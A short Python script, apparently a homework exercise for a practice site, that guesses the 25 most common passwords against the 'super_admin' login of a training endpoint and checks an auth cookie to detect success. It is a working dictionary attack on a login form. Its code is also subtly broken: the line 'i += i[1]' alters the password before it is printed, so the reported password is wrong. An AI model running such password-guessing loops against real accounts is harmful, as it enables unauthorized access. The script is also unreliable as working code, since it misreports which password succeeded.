import requests

# Top 25 most common passwords by year according to SplashData за 2019 год
pass_list = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
             "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely",
             "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]

# Цикл перебора паролей
for i in pass_list:
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                             data={"login": "super_admin", "password": f"{i}"})
    response2 = response.cookies
    response3 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                              cookies=response2)
    i += i[1]
    if response3.text.__contains__('You are authorized'):
        print("Пароль: " + i)
        print("You are authorized")
    else: print("You are NOT authorized")